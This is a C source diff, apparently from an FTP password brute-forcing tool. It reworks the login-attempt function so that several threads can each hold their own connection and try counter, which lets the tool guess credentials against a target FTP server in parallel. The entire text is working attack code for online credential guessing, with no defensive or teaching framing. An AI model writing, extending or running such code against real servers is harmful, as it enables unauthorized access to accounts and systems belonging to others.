@@ -44,19 +44,30 @@ int bruteforce(char *dest, unsigned int maxlength) {
   return 1;
 }
 
-int ftp_try_login(const char *address, unsigned int port, const char *user, const char *password) {
+int ftp_try_login(const char *address, unsigned int port, const char *user, const char *password, int thread_id) {
   char answer[128];
   char request[32];
   struct sockaddr_in addr;
-  static int tries = 0;
-  static int sock = 0;
-  int length;
+  static int tries[MAX_THREADS] = { 0 };
+  static int thread_socks[MAX_THREADS] = { 0 };
+  int sock, length;
 
-  if(sock == 0 || tries == 0) {
+  if(thread_id < 0 || thread_id >= MAX_THREADS) {
+    fprintf(stderr, "ftp_try_login(): Invalid thread id \"%d\" specified!", thread_id);
+    return -1;
+  }
+
+  sock = thread_socks[thread_id];
+
+  if(sock == 0 || tries[thread_id] == 0) {
     addr.sin_family = AF_INET;
     addr.sin_port = htons(port);
     addr.sin_addr.s_addr = inet_addr(address);  
     memset(addr.sin_zero, 0, sizeof(addr.sin_zero));
+
+    if(sock != 0) {
+      close(sock);
+    }
 
     if((sock = socket(AF_INET, SOCK_STREAM, 0)) < 0) {
       perror("ftp_try_login (socket)");
@@ -76,11 +87,12 @@ int ftp_try_login(const char *address, unsigned int port, const char *user, cons
 
     if(strncmp(answer, "220", 3) != 0) {
       close(sock);
-      sock = 0;
+      thread_socks[thread_id] = 0;
       return -1;
     }
 
-    tries = FTP_LOGIN_TRIES;
+    thread_socks[thread_id] = sock;
+    tries[thread_id] = FTP_LOGIN_TRIES;
   }
 
   answer[0] = '\0';
@@ -109,7 +121,7 @@ int ftp_try_login(const char *address, unsigned int port, const char *user, cons
     return -1;
   }
 
-  --tries;
+  --tries[thread_id];
   return (strncmp(answer, "230", 3) == 0) ? sock : 0;
 }
 
